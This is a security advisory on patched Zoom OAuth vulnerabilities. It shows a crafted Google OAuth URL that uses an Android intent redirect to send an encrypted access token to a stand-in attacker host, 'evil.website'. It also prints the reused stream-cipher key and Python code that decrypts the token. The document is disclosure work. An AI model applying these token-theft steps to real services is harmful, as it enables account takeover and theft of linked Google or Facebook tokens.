---
title: ' Zoom: Multiple OAuth vulnerabilities'
published: '2020-07-28T05:31:11Z'
severity: High
ghsa_id: GHSA-6r3h-49f8-wwph
cve_id: ''
weaknesses: []
products:
- ecosystem: ''
  package_name: zoom.us
  affected_versions: <2020.04.29
  patched_versions: 2020.07.24
cvss: null
credits:
- github_user_id: sirdarckcat
  name: Eduardo' Vela" <Nava> (sirdarckcat)
  avatar: https://avatars.githubusercontent.com/u/33089?s=40&v=4
- github_user_id: RenwaX23
  name: Renwa
  avatar: https://avatars.githubusercontent.com/u/13907591?s=40&v=4
---

### Summary

The endpoints `https://zoom.us/signin/term?token` and `https://zoom.us/google/oauth?token` were vulnerable to multiple security vulnerabilities. An attacker could use these vulnerabilities to steal access tokens on Android.

This advisory encompasses a security vulnerability caused by an open redirect in one endpoint that included an encrypted access token, as well as an additional crypto vulnerability in another endpoint that could be used to decrypt the encrypted access tokens.

### Severity

Calculated as **High** by Google ([source](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N/E:P/RL:O/RC:C)). The attacker needs to convince a victim to visit a malicious link on an Android phone. The attacker can then steal a token that allows them to login as the victim, and gain access to the victim's Zoom.us account, as well as access the victim's Facebook / Google access token.

This could allow an attacker to do anything the victim can do through the website, and for those users that had enabled the Google Calendar to Zoom integration, it would also allow the attacker to access private Google Calendar data.

### Proof of Concept

The attack could be performed by making the user visit the following URL:
```
https://accounts.google.com/o/oauth2/v2/auth?response_type=code&access_type=offline&client_id=849883241272-ed6lnodi1grnoomiuknqkq2rbvd2udku.apps.googleusercontent.com&scope=profile%20email&redirect_uri=https%3A%2F%2Fzoom.us%2Fgoogle%2Foauth&state=intent%3A%2F%2Fzoom.us%2Fgoogle%2Foauth?#Intent;scheme=https://evil.website/;end;
```

Which results in:
```
https://evil.website/zoom.us/google/oauth?&token=ENCRYPTED_TOKEN
```

The attacker then just takes `ENCRYPTED_TOKEN` and posts it here:
```
https://zoom.us/google/oauth?token=ENCRYPTED_TOKEN
```

Which then redirects to:
```
https://zoom.us/signin/term?token=ANOTHER_ENCRYPTED_TOKEN
```

At this point, `ANOTHER_ENCRYPTED_TOKEN` can be decrypted by XORing it with:
```
8da41d47d9989e0b1a2ae4a58029b732c64976ec8d1e9b81e2112ecac33dfc7f8563403302639656822252d21f70b8b046d5437ebcc44d93d2f355bd4664398d0b28f743bcf9376465e1c2964f9e04225ca115f5dda85d2f91ff350c4c1d2ba052b7a03ff5b71babf301bafe37bb6b1aa45a7588282f5b562c53d8316fd29e9b97d203575cba4aadd22e8a5818062b0beed7141ef34e177f8ed4a1e74936e97037bafdb9ce9b37be07d816
```

Using:
```python
def decrypt(unknown):
    unknown = base64.urlsafe_b64decode(unknown)
    return "".join([chr(ord(unknown[c]) ^ ord(key[c])) for c in range(min(len(unknown),len(key)))])
```

This would then leak the Facebook or Google access token to the attacker, and can also be used to impersonate the user on Zoom.us.

### Analysis

The token leak only works against Chrome on Android users. The attack could be performed by tricking users into visiting the following URL:
```
https://accounts.google.com/o/oauth2/v2/auth?response_type=code&access_type=offline&client_id=849883241272-ed6lnodi1grnoomiuknqkq2rbvd2udku.apps.googleusercontent.com&scope=profile%20email&redirect_uri=https%3A%2F%2Fzoom.us%2Fgoogle%2Foauth&state=intent%3A%2F%2Fzoom.us%2Fgoogle%2Foauth?#Intent;scheme=https://evil.website/;end;
```

The victim would then land on:
```
https://zoom.us/google/oauth?state=intent%3A%2F%2Fzoom.us%2Fgoogle%2Foauth%3F&code=SECRET&scope=email+profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile+openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email&authuser=0&prompt=none#Intent;scheme=https://evil.website/;end;
```

And subsequently on:
```
intent://zoom.us/google/oauth?&token=ENCRYPTED_TOKEN#Intent;scheme=https://evil.website/;end;
```

And finally:
```
https://evil.website/zoom.us/google/oauth?&token=ENCRYPTED_TOKEN
```

The flow using Facebook was also affected. The behavior presented using the `intent://` URL was [discovered by Renwa](https://twitter.com/RenwaX23/status/1255481313508950017). The documentation for this feature is described in the documentation of [Android intents for Chrome](https://developer.chrome.com/multidevice/android/intents).

It seems like the cipher used PKCS7 padding, since the following error was visible in the UI when sending a malformed token:
![image](https://user-images.githubusercontent.com/33089/88423865-cc319980-cdec-11ea-912b-33793672949d.png)

The endpoint didn't seem to use CBC, so decrypting the token wasn't possible through this padding oracle. However, the endpoint `zoom.us/google/oauth?token` redirected the user to `zoom.us/signin/term?token=ANOTHER_ENCRYPTED_TOKEN`, and in this case, the token was using a static stream cipher, or in other words, it was reusing a One-Time Pad (OTP).

Usually in order to break an OTP used more than once, one just XORs the ciphertext with a known plaintext, which returns the cipher stream, however, since in this case the attacker doesn't know their own access token, one can't get it this way. Instead, since we know that the plaintext has a limited alphabet (access tokens are encoded in base64 or base32), one can decode the token character by character by a process of elimination.

For example, if we have 4 tokens, which have at the Nth character the following values:
 - `encrypted_token1[n] = "b"` (which is `stream_cipher[n] ^ access_token1[n]`)
 - `encrypted_token2[n] = "/"` (which is `stream_cipher[n] ^ access_token2[n]`)
 - `encrypted_token3[n] = "F"` (which is `stream_cipher[n] ^ access_token3[n]`)
 - `encrypted_token4[n] = "V"` (which is `stream_cipher[n] ^ access_token4[n]`)

We can deduce the value of `stream_cipher[n]` the following way:
 - `t1t2 = chr(ord("b") ^ ord("/")) = "M" = access_token1[n] ^ access_token2[n]`
 - `t1t3 = chr(ord("b") ^ ord("F")) = "$" = access_token1[n] ^ access_token3[n]`
 - `t1t4 = chr(ord("b") ^ ord("V")) = "4" = access_token1[n] ^ access_token4[n]`

We know that `M` can only be the result of:
 - `chr(ord("y") ^ ord("4"))`
 - `chr(ord("5") ^ ord("x"))`
 - `chr(ord("t") ^ ord("9"))`
 - `chr(ord("7") ^ ord("z"))`
 - `chr(ord("8") ^ ord("u"))`

We can do this calculation for all characters in the allowed alphabet with the following code:
```python
import base64
options = {}
for c in range(0,255):
  for d in range(0,255):
    c_e = base64.urlsafe_b64encode(chr(c))[0]
    d_e = base64.urlsafe_b64encode(chr(d))[0]
    res = chr(ord(c_e)^ord(d_e))
    if res not in options:
      options[res] = {}
    options[res][c_e] = d_e
    options[res][d_e] = c_e
```

Once we have this, we can obtain the value of `access_token1[n]` and `stream_cipher[n]` with:
```python
list(set(options[t1t2]) & set(options[t1t3]) & set(options[t1t4])) == ["u"] # access_token1[n]
chr(ord("u")^ord("b")) == "\x17" # stream_cipher[n]
```

By repeating this for all positions of the encrypted access token, one can reverse the value of the stream cipher, and decrypt the access token. The "One-Time" pad was:
```
8da41d47d9989e0b1a2ae4a58029b732c64976ec8d1e9b81e2112ecac33dfc7f8563403302639656822252d21f70b8b046d5437ebcc44d93d2f355bd4664398d0b28f743bcf9376465e1c2964f9e04225ca115f5dda85d2f91ff350c4c1d2ba052b7a03ff5b71babf301bafe37bb6b1aa45a7588282f5b562c53d8316fd29e9b97d203575cba4aadd22e8a5818062b0beed7141ef34e177f8ed4a1e74936e97037bafdb9ce9b37be07d816
```